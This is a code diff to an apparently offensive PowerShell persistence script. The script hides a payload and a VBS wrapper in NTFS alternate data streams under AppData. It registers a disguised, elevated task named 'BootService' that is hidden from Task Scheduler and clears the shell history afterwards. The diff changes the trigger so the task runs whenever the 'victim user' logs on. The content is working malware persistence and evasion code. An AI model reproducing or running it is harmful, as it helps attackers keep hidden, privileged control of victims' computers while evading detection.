@@ -86,6 +86,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     "Payload stored in $env:USERPROFILE\AppData:$textFile"
     Invoke-Command -ScriptBlock $CreateWrapperADS
     "Wrapper stored in $env:USERPROFILE\AppData:$vbsFile"
+    #Dertermine the way to create peristent payload according to the session privilege level.
     if (!(Test-IsAdmin)){
        $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN BootService /TR $env:USERPROFILE\AppData:$vbsFile /F"}
        Invoke-Command -ScriptBlock $CreateScheduleADS
@@ -95,12 +96,13 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        Clear-History
     }
     else {
-       $script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
+       $script = "$env:USERPROFILE\AppData:$vbsFile"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
-       $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(30) -RepeatIndefinitely -RepetitionInterval "00:30:00"
+      # $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(30) -RepeatIndefinitely -RepetitionInterval "00:30:00"
+       $Trig = New-JobTrigger -Once -AtLogOn
        $scriptblock = [scriptblock]::Create($script)
        Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
-       "Process Complete. Persistent schtask is created and will be triggered on every 30 mins."
+       "Process Complete. Persistent schtask is created and will be triggered once the victim user logs on the computer."
        Clear-History
     }
 
